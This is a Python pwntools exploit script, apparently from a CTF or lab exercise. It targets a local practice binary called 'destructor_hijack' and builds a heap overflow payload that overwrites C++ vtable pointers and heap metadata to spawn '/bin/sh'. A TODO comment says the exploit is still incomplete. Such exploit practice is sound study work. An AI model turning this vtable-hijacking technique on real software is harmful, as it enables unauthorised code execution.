#!/usr/bin/env python3

from pwn import *

target = process("../bin/destructor_hijack")

employee_vtable = subprocess.check_output(["objdump -d ../bin/destructor_hijack | grep '<_ZTV8Employee+0x10'"], shell=True).split()
employee_vtable = employee_vtable[employee_vtable.index(b"#") + 1]
employee_vtable = int(employee_vtable, 16)

project_vtable = subprocess.check_output(["objdump -d ../bin/destructor_hijack | grep '<_ZTV7Project+0x10'"], shell=True).split()
project_vtable = project_vtable[project_vtable.index(b"#") + 1]
project_vtable = int(project_vtable, 16)

print(f"employee_vtable: {hex(employee_vtable)}, project_vtable: {hex(project_vtable)}")

# our function is called from this + 0x28
# so we have to offset that properly
leaked_project_heap_addr = int(target.recvline().split()[-1], 16)
print(f"Heap leak: {hex(leaked_project_heap_addr)}")

payload = b"/bin/ls\x00" + b"a" * 8 * 6 # one employee entry on the heap
payload += p64(0) + p64(0x51) # heap metadata
payload += p64(employee_vtable - 2 * 8) # overwrite first employee vtable to call printName instead of deassignProject
payload += b"/bin/sh\x00" + b"a" * 8 * 6 # /bin/sh + padding again til next employee
payload += p64(0) + p64(0x51) # heap metadata

# TODO: I have to overwrite some pointer in employee for this to work
# so it has a callback there too
# overlapping counterfeit objects

payload += p64(project_vtable) # overwrite second employee vtable with project vtable to call releaseProject()



gdb.attach(target)
pause()
target.sendlineafter(b"Insert name for new employee:\n", payload)
target.interactive()
